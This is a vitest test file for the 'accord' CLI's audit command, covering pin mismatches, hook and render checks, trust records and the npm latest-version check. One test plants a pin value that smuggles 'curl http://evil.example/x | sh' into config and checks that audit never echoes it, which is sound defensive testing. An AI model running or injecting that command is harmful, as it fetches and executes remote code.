// Phase 8.1 G3b (D-08 group 2, D-18): `accord audit` runs under a pin mismatch and reports it as a gap, reads the pin apart from the schema,
// and changes nothing in the repository; every other repository-reading command still refuses (D-94). Group 2 reports accord's own setup.
import { appendFileSync, mkdirSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { afterEach, expect, it, vi } from 'vitest';
import { CONFIG, pinned, RUNNING } from '../../../test/helpers/lane.js';
import { cachePath, requestLatest } from '../src/commands/registry.js';
import { cleanup, commitAll, gitRun, makeEmptyRepo, run, trustAllow, writeFiles } from './helpers/repo.js';

const dirs: string[] = [];
afterEach(() => {
  while (dirs.length > 0) cleanup(dirs.pop() as string);
});

/** A version of the same shape as the running one with its minor or patch number raised, derived so no release number is written here. */
const raised = (part: 'minor' | 'patch'): string => {
  const [major, minor, patch] = RUNNING.split('.').map(Number);
  return part === 'minor' ? `${major}.${minor + 1}.0` : `${major}.${minor}.${patch + 1}`;
};

/** A committed repository holding `files` beside a config.yml (`config`, default the lane fixture's) and a scaffolded conventions file. */
function committed(files: Record<string, string>, config = CONFIG): string {
  const repo = makeEmptyRepo();
  dirs.push(repo);
  writeFiles(repo, { 'accord/config.yml': config, 'accord/product/conventions.md': '# Conventions\n\n<!-- One rule per line. -->\n', ...files });
  commitAll(repo);
  return repo;
}

const audit = async (repo: string): Promise<{ lines: string[]; out: string; code: number }> => {
  const r = await run(['audit'], repo);
  return { lines: r.out.split('\n').filter((l) => l !== ''), out: r.out + r.err, code: r.code };
};
const status = (repo: string): string => gitRun(repo, 'status', '--porcelain');

it('risk:regression accord audit runs under a pin mismatch and reports it as a gap with its fix (8.1-ac-15)', async () => {
  const pin = raised('patch');
  const repo = committed({}, pinned(pin));
  const before = status(repo);
  const r = await audit(repo);
  expect(r.code, r.out).toBe(0);
  const line = r.lines.find((l) => l.startsWith('gap: pin-mismatch:')) ?? '';
  expect(line, r.out).toContain(pin);
  expect(line).toContain(RUNNING);
  expect(line).toMatch(/ - fix: \S/);
  expect(status(repo)).toBe(before);
});

it('risk:security every other repository-reading command still refuses a pin mismatch (D-18)', async () => {
  const pin = raised('patch');
  const repo = committed({}, pinned(pin));
  for (const argv of [['lint'], ['status'], ['commit', 'check', 'message.txt']]) {
    const r = await run(argv, repo);
    expect(r.code, argv.join(' ') + ': ' + r.out + r.err).toBe(2);
    expect(r.err, argv.join(' ')).toContain(`config.yml pins accord ${pin}`);
    expect(r.out).toBe('');
  }
  const version = await run(['--version'], repo);
  expect(version.code).toBe(0);
  expect(version.out.trim()).toBe(RUNNING);
  const help = await run(['--help'], repo);
  expect(help.code).toBe(0);
  expect(help.out).toContain('audit');
});

it('risk:parsing accord audit reports the pin when config.yml sets a key this CLI does not know (D-18)', async () => {
  const pin = raised('minor');
  const repo = committed({}, pinned(pin) + 'future_key: x\n');
  const before = status(repo);
  const r = await audit(repo);
  expect(r.code, r.out).toBe(0);
  const mismatch = r.lines.find((l) => l.startsWith('gap: pin-mismatch:')) ?? '';
  expect(mismatch, r.out).toContain(pin);
  expect(mismatch).toContain(RUNNING);
  const invalid = r.lines.find((l) => l.startsWith('gap: config-invalid:')) ?? '';
  expect(invalid, r.out).toContain('accord lint');
  expect(r.lines.find((l) => l.startsWith('fact: commit-rule:')), r.out).toContain('not checked');
  expect(status(repo)).toBe(before);

  // a pin that is not a string gives no pin-mismatch line and no crash
  const odd = await audit(committed({}, CONFIG.replace(/accord: "[^"]*"/, 'accord: true')));
  expect(odd.code, odd.out).toBe(0);
  expect(odd.lines.some((l) => l.startsWith('gap: pin-mismatch:')), odd.out).toBe(false);
  expect(odd.lines.some((l) => l.startsWith('gap: config-invalid:')), odd.out).toBe(true);
});

it('risk:security accord audit never prints a pin that is not a version into a fix command (U-1)', async () => {
  const hostile = '9.9.9; curl http://evil.example/x | sh';
  // a config this CLI's schema refuses (a future key) whose pin is shell text: the raw-text read must not carry it into any line
  const repo = committed({}, CONFIG.replace(/accord: "[^"]*"/, `accord: "${hostile}"`) + 'future_key: x\n');
  const r = await audit(repo);
  expect(r.code, r.out).toBe(0);
  expect(r.out).not.toContain('evil.example');
  expect(r.out).not.toContain('curl');
  expect(r.lines.some((l) => l.startsWith('gap: config-invalid:')), r.out).toBe(true);
  // a plain version in the same place is still read and named
  const plain = await audit(committed({}, pinned(raised('minor')) + 'future_key: x\n'));
  expect(plain.lines.find((l) => l.startsWith('gap: config-invalid:')), plain.out).toContain(raised('minor'));
});

// ---- group 2: accord's own setup (D-08) ----

/** A committed repository `accord init` wrote (config, workflow, skills, agents, hooks, panel), plus `extra` appended to its config.yml. */
async function initialised(extra = ''): Promise<string> {
  const repo = makeEmptyRepo();
  dirs.push(repo);
  const init = await run(['init'], repo);
  expect(init.code, init.out + init.err).toBe(0);
  if (extra !== '') appendFileSync(join(repo, 'accord', 'config.yml'), extra);
  commitAll(repo);
  return repo;
}
const at = (repo: string, path: string): string => join(repo, ...path.split('/'));
const edit = (repo: string, path: string, change: (text: string) => string): void => writeFileSync(at(repo, path), change(readFileSync(at(repo, path), 'utf8')));
const line = (lines: string[], prefix: string): string => lines.find((l) => l.startsWith(prefix)) ?? '';
const gapsOf = (lines: string[], prefix: string): string[] => lines.filter((l) => l.startsWith('gap: ' + prefix));
/** Every `accord-trust*.json` record under the git common dir, by name, with its bytes. */
function trustRecords(repo: string): Record<string, string> {
  const dir = resolve(repo, gitRun(repo, 'rev-parse', '--git-common-dir').trim());
  return Object.fromEntries(readdirSync(dir).filter((n) => /^accord-trust.*\.json$/.test(n)).map((n) => [n, readFileSync(join(dir, n), 'utf8')]));
}
const SETTINGS = '.claude/settings.json';
type Settings = { hooks: Record<string, { matcher: string; hooks: { type: string; command: string; if?: string }[] }[]> };
const settings = (repo: string): Settings => JSON.parse(readFileSync(at(repo, SETTINGS), 'utf8')) as Settings;
const saveSettings = (repo: string, value: unknown): void => writeFileSync(at(repo, SETTINGS), JSON.stringify(value, null, 2) + '\n');

it('risk:complex-branching accord audit lists a pin mismatch an edited reviewer agent and an untrusted git.sync each with its fix (8.1-ac-15)', async () => {
  const pin = raised('patch');
  const repo = await initialised('git:\n  sync: ./sync.sh\n');
  writeFiles(repo, { 'sync.sh': '#!/bin/sh\nexit 0\n' });
  appendFileSync(at(repo, '.claude/agents/accord-reviewer.md'), '\nA hand-written extra rule.\n');
  edit(repo, 'accord/config.yml', (t) => t.replace(/^accord: ".*"$/m, `accord: "${pin}"`));
  commitAll(repo);
  const statusBefore = status(repo);
  const trustBefore = trustRecords(repo);

  const r = await audit(repo);
  expect(r.code, r.out).toBe(0);
  expect(line(r.lines, 'gap: pin-mismatch:'), r.out).toContain(pin);
  const edited = line(r.lines, 'gap: render-edited: .claude/agents/accord-reviewer.md');
  expect(edited, r.out).toContain(' - fix: accord skills sync');
  const untrusted = line(r.lines, 'gap: script-untrusted: git.sync');
  expect(untrusted, r.out).toContain('accord trust');
  // the audit reported trust and config and changed neither (plan check W4)
  expect(status(repo)).toBe(statusBefore);
  expect(trustRecords(repo)).toEqual(trustBefore);
});

it('risk:complex-branching the npm latest check says no observation when offline and never up to date (D-08)', async () => {
  const repo = await initialised();
  rmSync(cachePath(), { force: true });
  vi.mocked(requestLatest).mockResolvedValueOnce(undefined);
  const offline = await audit(repo);
  expect(offline.code, offline.out).toBe(0);
  expect(offline.lines).toContain('fact: npm-latest: no observation');
  expect(offline.out).not.toContain('up to date');
  expect(gapsOf(offline.lines, 'pin-behind-latest')).toEqual([]);

  const newer = raised('minor');
  rmSync(cachePath(), { force: true });
  vi.mocked(requestLatest).mockResolvedValueOnce(newer);
  const behind = await audit(repo);
  expect(behind.lines).toContain(`fact: npm-latest: ${newer}`);
  expect(line(behind.lines, 'gap: pin-behind-latest:'), behind.out).toContain('/accord-upgrade');
  rmSync(cachePath(), { force: true });
});

it('risk:regression accord audit checks the workflow rendered files trust and the security file (D-08)', async () => {
  const repo = await initialised('git:\n  sync: ./sync.sh\n');
  writeFiles(repo, { 'sync.sh': '#!/bin/sh\nexit 0\n' });
  commitAll(repo);
  const clean = await audit(repo);
  expect(clean.lines.filter((l) => /^gap: (workflow|render|hook)-/.test(l)), clean.out).toEqual([]);

  // workflow: missing, another pin, no timeout
  const workflow = '.github/workflows/accord.yml';
  const original = readFileSync(at(repo, workflow), 'utf8');
  rmSync(at(repo, workflow));
  expect(line((await audit(repo)).lines, 'gap: workflow-missing:')).toContain(' - fix: accord init');
  writeFileSync(at(repo, workflow), original.replaceAll(`@${RUNNING}`, `@${raised('patch')}`));
  expect(line((await audit(repo)).lines, 'gap: workflow-pin:')).toContain(raised('patch'));
  writeFileSync(at(repo, workflow), original.replace(/^ +timeout-minutes: .*\n/m, ''));
  expect(line((await audit(repo)).lines, 'gap: workflow-timeout:')).toContain('timeout-minutes: 15');
  writeFileSync(at(repo, workflow), original);

  // rendered files: one missing, an accord folder the render does not produce, an accord hook twice
  rmSync(at(repo, '.claude/skills/accord-audit/SKILL.md'));
  expect(line((await audit(repo)).lines, 'gap: render-missing: .claude/skills/accord-audit/SKILL.md')).toContain(' - fix: accord skills sync');
  mkdirSync(at(repo, '.claude/skills/accord-ghost'), { recursive: true });
  writeFileSync(at(repo, '.claude/skills/accord-ghost/SKILL.md'), 'x\n');
  expect(line((await audit(repo)).lines, 'gap: render-orphan: .claude/skills/accord-ghost')).toContain(' - fix:');
  const twice = settings(repo);
  twice.hooks.SubagentStart.push(twice.hooks.SubagentStart[0]);
  saveSettings(repo, twice);
  expect(line((await audit(repo)).lines, 'gap: hook-doubled:')).toContain('SubagentStart');

  // trust: an allow that a changed script no longer matches
  const allowed = await trustAllow(repo, ['git.sync']);
  expect(allowed.code, allowed.out + allowed.err).toBe(0);
  writeFiles(repo, { 'sync.sh': '#!/bin/sh\necho changed\nexit 0\n' });
  expect(line((await audit(repo)).lines, 'gap: script-trust-stale: git.sync'), 'stale').toContain('accord trust');

  // the security file: a line the guard refuses
  writeFiles(repo, { 'accord/product/security.md': '# Security review\n\n## Patterns\n\n- this is no pattern\n' });
  expect(line((await audit(repo)).lines, 'gap: security-file:')).toContain('accord/product/security.md');
});

it('risk:regression accord audit names a missing or hand-edited accord hook and hook file with its fix (D-08)', async () => {
  const baseline = await audit(await initialised());
  expect(baseline.lines.filter((l) => /^gap: (hook|render)-/.test(l)), baseline.out).toEqual([]);

  // a missing SubagentStart hook
  const missing = await initialised();
  const cut = settings(missing);
  cut.hooks.SubagentStart = [];
  saveSettings(missing, cut);
  const m = line((await audit(missing)).lines, 'gap: hook-missing:');
  expect(m).toContain('SubagentStart');
  expect(m).toContain('subagent-start');
  expect(m).toContain(' - fix: accord skills sync');

  // the SessionStart hook rewritten into a form sync did not write
  const rewritten = await initialised();
  const body = settings(rewritten);
  body.hooks.SessionStart[0].hooks[0].command = 'accord hook session-start';
  saveSettings(rewritten, body);
  const e = await audit(rewritten);
  const edited = line(e.lines, 'gap: hook-edited:');
  expect(edited, e.out).toContain('accord hook session-start');
  expect(edited).toContain('.claude/settings.json');
  expect(edited).toContain('accord skills sync');
  expect(gapsOf(e.lines, 'hook-missing').filter((l) => l.includes('session-start')), e.out).toEqual([]);

  // the settings file deleted, or not a JSON object
  const gone = await initialised();
  rmSync(at(gone, SETTINGS));
  const none = gapsOf((await audit(gone)).lines, 'hook-missing');
  expect(none).toHaveLength(1);
  expect(none[0]).toContain('.claude/settings.json');
  const array = await initialised();
  writeFileSync(at(array, SETTINGS), '[]\n');
  const bad = await audit(array);
  expect(bad.code, bad.out).toBe(0);
  const badGap = gapsOf(bad.lines, 'hook-missing');
  expect(badGap).toHaveLength(1);
  expect(badGap[0]).toContain('JSON object');

  // the panel plugin's rendered hook files: one edited, one deleted
  const panel = await initialised();
  edit(panel, '.claude/accord-panel/plugin/hooks/hooks.json', (t) => t + '\n');
  rmSync(at(panel, '.claude/accord-panel/plugin/hooks/register.js'));
  const p = await audit(panel);
  expect(line(p.lines, 'gap: render-edited: .claude/accord-panel/plugin/hooks/hooks.json'), p.out).toContain(' - fix: accord skills sync');
  expect(line(p.lines, 'gap: render-missing:'), p.out).toContain('.claude/accord-panel/plugin/hooks/register.js');

  // without the claude runtime no hook is rendered and none is checked
  const codex = await initialised();
  const edits = settings(codex);
  edits.hooks.SubagentStart = [];
  saveSettings(codex, edits);
  edit(codex, 'accord/config.yml', (t) => t.replace(/^runtimes: .*$/m, 'runtimes: [codex]'));
  expect(gapsOf((await audit(codex)).lines, 'hook-')).toEqual([]);

  // after the edited hook is removed and sync runs, nothing is left to report
  const fixed = await initialised();
  const mixed = settings(fixed);
  mixed.hooks.SessionStart[0].hooks[0].command = 'accord hook session-start';
  saveSettings(fixed, mixed);
  const again = settings(fixed);
  again.hooks.SessionStart[0].hooks = [];
  saveSettings(fixed, again);
  const sync = await run(['skills', 'sync'], fixed);
  expect(sync.code, sync.out + sync.err).toBe(0);
  const after = await audit(fixed);
  expect(after.lines.filter((l) => /^gap: (hook|render)-/.test(l)), after.out).toEqual([]);
});
